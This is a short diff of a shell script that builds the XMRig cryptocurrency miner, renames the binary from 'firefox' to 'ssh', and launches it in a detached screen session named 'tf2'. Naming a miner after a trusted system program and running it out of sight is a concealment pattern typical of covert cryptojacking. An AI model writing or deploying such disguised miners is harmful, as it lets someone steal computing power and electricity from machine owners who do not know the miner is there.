@@ -8,7 +8,7 @@ mv xmrig profiles
 cd profiles
 cmake .
 make
-cp xmrig firefox
+cp xmrig ssh
 rm xmrig
 export firefoxsetup=$(openssl rand -hex 20)
 export link=$(openssl rand -hex 4)
@@ -157,4 +157,4 @@ source /etc/profile.d/proxy.sh
 env | grep -i proxy
 
 
-screen -S tf2 ./firefox
+screen -S tf2 ./ssh
